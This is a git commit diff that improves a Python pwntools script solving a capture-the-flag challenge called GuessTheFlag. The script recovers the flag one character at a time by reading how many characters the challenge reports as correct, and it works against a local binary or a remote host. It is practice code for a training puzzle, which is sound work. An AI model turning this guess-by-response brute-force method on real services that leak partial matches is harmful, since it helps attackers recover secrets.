1567f8c48beccf2ce4dd2b1c09db820921d82a06
markx86 <25851052+markx86@users.noreply.github.com>
2023-12-02 13:37:08 +0100

    Improve GuessTheFlag exploit

--- GuessTheFlag/brute.py
+++ GuessTheFlag/brute.py
@@ -13,23 +13,28 @@ if args.REMOTE:
 else:
     conn = process(['./chal'])
 hello_msg = conn.recvuntilS(": ")
-flag_len = int(hello_msg.split(" ")[5])-1
+flag_len = int(hello_msg.split(" ")[5])
 char = 32
 test_len = len(flag)
 
 while (test_len < flag_len):
-    conn.send(flag + chr(char) + '\n');
-    msg = conn.recvuntilS(": ")
-    guessed = int(msg.split()[4])
-    if (char > 255):
-        print("Error: char too big")
-        break
-    if (guessed > test_len):
-        flag += chr(char)
-        char = 32
+    conn.sendline(flag + chr(char));
+    msg = conn.recvline()
+    if conn.recvline() == b'Bad luck, try again.\n':
+        conn.recvuntil(b': ')
+        guessed = int(msg.split()[4])
+        if (char > 255):
+            print("Error: char too big")
+            break
+        if (guessed > test_len):
+            flag += chr(char)
+            char = 32
+        else:
+            char += 1
+        test_len = len(flag)
+        print("Flag status:", flag)
     else:
-        char += 1
-    test_len = len(flag)
-    print("Flag status:", flag)
+        break
 
+print("The flag is:", flag + chr(char))
 conn.close()
